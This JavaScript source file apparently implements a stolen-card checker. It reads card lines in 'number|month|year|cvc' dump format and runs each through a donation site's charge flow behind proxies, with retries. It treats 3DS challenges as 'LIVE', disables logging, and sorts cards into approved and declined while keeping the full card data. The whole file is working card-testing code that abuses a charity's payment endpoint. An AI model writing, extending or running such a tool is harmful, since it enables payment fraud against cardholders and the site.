import { ChargeResult } from '../domain/ChargeResult.js';
import { RememberOrgClient } from '../infrastructure/charge/RememberOrgClient.js';
import { DEFAULT_CHARGE_SITE } from '../utils/constants.js';
import { GatewayMessageFormatter } from '../utils/GatewayMessageFormatter.js';

/**
 * Charge Gateway Validator
 * Validates cards via donation site charge flow (Remember.org)
 * Creates PaymentMethod -> submits to WP AJAX -> gets charge result
 */
export class ChargeGatewayValidator {
    constructor(options = {}) {
        this.site = options.site || DEFAULT_CHARGE_SITE;
        this.proxyManager = options.proxyManager || null;
        this.maxRetries = options.maxRetries || 1;
        this.debug = options.debug !== false;
        this.initClient();
    }

    _log(message, data = null) {
        // Logging disabled
    }

    initClient() {
        this._log(`Initializing client for site: ${this.site?.label}`);
        this.siteClient = new RememberOrgClient(this.site, {
            proxyManager: this.proxyManager,
            debug: this.debug
        });
    }

    getName() {
        return `ChargeGatewayValidator (${this.site.label})`;
    }

    setSite(site) {
        this.site = site;
        this.initClient();
    }

    async validate(cardInfo) {
        const startTime = Date.now();
        const fullCard = `${cardInfo.number}|${cardInfo.expMonth}|${cardInfo.expYear}|${cardInfo.cvc}`;
        const cardPreview = `${cardInfo.number?.slice(0, 6)}****`;

        this._log(`Starting validation for ${cardPreview}`);

        let lastError = null;
        let lastIsNetworkError = false;

        for (let retry = 0; retry <= this.maxRetries; retry++) {
            this._log(`Attempt ${retry + 1}/${this.maxRetries + 1}`);
            try {
                const result = await this.attemptValidation(cardInfo, fullCard, startTime);

                // Return immediately for approved/declined (definitive results)
                if (result.isApproved() || result.isDeclined()) {
                    this._log(`Definitive result: ${result.status}`, { duration: Date.now() - startTime });
                    return result;
                }

                // For errors, track if it's a network error for retry logic
                lastError = result.message;
                lastIsNetworkError = result.isNetworkError || false;
                this._log(`Non-definitive result, may retry`, { error: lastError, isNetworkError: lastIsNetworkError });
            } catch (error) {
                lastError = error.message;
                lastIsNetworkError = true;
                this._log(`Exception caught`, { error: lastError });
            }

            if (retry < this.maxRetries) {
                this._log(`Waiting 1s before retry...`);
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        this._log(`RETRY_EXHAUSTED after ${this.maxRetries + 1} attempts`, { lastError });
        return ChargeResult.error(`RETRY_EXHAUSTED: ${lastError}`, {
            card: fullCard,
            site: this.site.label,
            duration: Date.now() - startTime
        });
    }

    async attemptValidation(cardInfo, fullCard, startTime) {
        this._log(`attemptValidation: Calling siteClient.validate()`);
        const result = await this.siteClient.validate(cardInfo);
        this._log(`attemptValidation: siteClient returned`, { success: result.success, approved: result.approved, status: result.status, message: result.message, isNetworkError: result.isNetworkError });

        // Network/proxy errors - return as ERROR status
        if (!result.success) {
            if (result.isNetworkError) {
                this._log(`attemptValidation: Network error detected`);
                return ChargeResult.error(result.error || result.code || 'Network error', {
                    card: fullCard,
                    site: this.site.label,
                    duration: Date.now() - startTime,
                    declineCode: result.code
                });
            }
            // Non-network errors (shouldn't happen, but handle gracefully)
            this._log(`attemptValidation: Non-network error`);
            const parsed = GatewayMessageFormatter.parseDeclineFromText(result.error);
            return ChargeResult.error(parsed.message, {
                card: fullCard,
                site: this.site.label,
                duration: Date.now() - startTime,
                declineCode: parsed.code
            });
        }

        // Determine status: 3DS_REQUIRED is treated as LIVE
        let status;
        let declineCode = null;

        if (result.status === '3DS_REQUIRED') {
            status = '3DS_REQUIRED';
        } else if (result.approved) {
            status = 'APPROVED';
        } else {
            status = 'DECLINED';
            // Parse the decline message to get standardized code
            const parsed = GatewayMessageFormatter.parseDeclineFromText(result.message);
            declineCode = parsed.code;
        }

        // Get formatted message
        const formatted = GatewayMessageFormatter.formatResponse({
            status,
            message: result.message,
            declineCode,
            gateway: 'charge'
        });

        return new ChargeResult({
            status,
            message: formatted.formattedMessage,
            success: result.approved || result.status === '3DS_REQUIRED',
            card: fullCard,
            brand: result.brand,
            country: result.country,
            last4: result.last4,
            site: this.site.label,
            duration: Date.now() - startTime,
            donationId: result.donationId,
            declineCode
        });
    }

    parseCard(cardLine) {
        if (!cardLine || typeof cardLine !== 'string') return null;
        const parts = cardLine.split('|');
        if (parts.length !== 4) return null;

        let [number, expMonth, expYear, cvc] = parts.map(p => (p || '').trim());
        number = number.replace(/\s/g, '');

        if (number.length < 13) return null;

        expYear = expYear.length === 4 ? expYear.slice(-2) : expYear;
        expMonth = expMonth.padStart(2, '0');

        return { number, expMonth, expYear, cvc };
    }
}
